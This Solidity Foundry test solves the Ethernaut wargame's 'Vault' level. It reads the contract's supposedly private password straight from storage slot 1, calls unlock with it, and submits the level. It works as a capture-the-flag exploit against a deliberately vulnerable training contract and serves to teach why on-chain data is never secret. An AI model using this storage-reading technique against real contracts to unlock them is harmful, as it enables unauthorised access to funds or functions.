// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/08-Vault/VaultFactory.sol";

contract VaultTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        emit log_named_string("the vault is locked", ethernautVault.locked() ? "true" : "false");
        assertTrue(ethernautVault.locked());

        // load slot 1 (password)
        bytes32 password = vm.load(address(ethernautVault), bytes32(uint256(1)));
        emit log_named_bytes32("unlock vault with password", password);
        ethernautVault.unlock(password);
       
        emit log_named_string("the vault is locked", ethernautVault.locked() ? "true" : "false");
        assertTrue(!ethernautVault.locked());
        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}